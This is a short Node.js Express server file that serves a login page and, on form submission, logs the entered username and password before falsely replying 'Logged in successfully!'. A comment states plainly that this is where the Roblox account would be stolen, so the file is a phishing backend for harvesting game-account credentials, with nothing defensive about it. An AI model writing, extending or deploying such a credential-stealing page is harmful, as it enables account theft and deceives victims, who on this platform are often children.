const express = require('express');
const bodyParser = require('body-parser');

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html');
});

app.post('/login', function(req, res) {
  var username = req.body.username;
  var password = req.body.password;

  // Here's where you would steal the Roblox account
  // using the provided username and password
  console.log('Username: ' + username);
  console.log('Password: ' + password);

  res.send('Logged in successfully!');
});

app.listen(3000, function() {
  console.log('Server listening on port 3000');
});
